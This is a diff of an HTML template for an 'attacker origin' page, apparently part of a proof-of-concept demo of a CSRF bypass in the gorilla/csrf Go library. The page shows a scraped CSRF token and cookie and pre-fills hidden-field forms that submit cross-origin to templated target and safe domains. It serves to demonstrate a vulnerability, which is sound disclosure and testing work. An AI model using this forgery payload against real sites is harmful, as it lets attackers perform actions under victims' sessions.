@@ -1,13 +1,35 @@
 <html>
 
-<head>Attacker origin</head>
+<head>
 <title>Attacker origin</title>
+</head>
 
 <body>
-    <h1>Attacker origin</h1>
+    <h1><code>gorilla/csrf</code> XSS demo</h1>
 
-    <p>Click the submit button to trigger the XSS. Your cookie has already been set to the correct value by the injected script.<p>
-    <script src="https://target.{{ .Domain }}/inject.js"></script>
+    <p>This page scrapes the target origin for valid CSRF token & cookie
+        values to use for its attack. It sets the cookie for the top level domain of
+        the target origin but with a more specific path to override any pre-existing
+        The form below has been pre-filled with the scraped
+        CSRF token and will successfully submit cross-origin to the target
+        application
+    </p>
+    <hr />
+    <code>
+        Token: {{ .Token }}<br/>
+        Cookie: {{ .Cookie }}<br/>
+    </code>
+    <hr />
+    <h3>Submit CSRF to <code>https://target.{{ .Domain }}/submit</code></h3>
+    <form method="post" action="https://target.{{ .Domain }}/submit">
+        <input type="hidden" name="gorilla.csrf.Token" value="{{ .Token }}">
+        <button type="submit">Submit CSRF</button>
+    </form>
+    <h3>Submit CSRF to <code>https://safe.{{ .Domain }}/submit</code></h3>
+    <form method="post" action="https://safe.{{ .Domain }}/submit">
+        <input type="hidden" name="gorilla.csrf.Token" value="{{ .Token }}">
+        <button type="submit">Submit CSRF</button>
+    </form>
 </body>
 
 </html>
